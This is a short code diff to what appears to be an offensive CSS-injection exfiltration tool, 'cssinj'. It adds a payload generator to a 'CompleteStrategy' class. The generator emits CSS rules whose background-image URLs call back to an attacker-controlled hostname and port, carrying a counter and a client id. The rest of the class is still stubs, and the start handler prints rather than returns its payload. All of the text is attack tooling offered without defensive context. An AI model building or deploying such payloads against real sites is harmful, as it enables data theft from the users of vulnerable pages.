@@ -1,4 +1,5 @@
 from cssinj.strategies.base import BaseExfiltrationStrategy
+from cssinj.utils.default import ELEMENTS
 
 
 class CompleteStrategy(BaseExfiltrationStrategy):
@@ -22,7 +23,7 @@ class CompleteStrategy(BaseExfiltrationStrategy):
         self.attribut = attribut
 
     def generate_start_payload(self, client) -> str:
-        return "start"
+        print(self._generate_payload(client))
 
     def generate_next_payload(self, client) -> str:
         return "next"
@@ -32,3 +33,10 @@ class CompleteStrategy(BaseExfiltrationStrategy):
 
     def handle_end(self, client) -> None:
         return "end"
+
+    def _generate_payload(self, client) -> str:
+        elements = "".join(
+            f"html > {element}:nth-child(1){{background:url('//{self.hostname}:{self.port}/e?n={client.counter}&cid={client.id}');}}"
+            for element in ELEMENTS
+        )
+        return elements
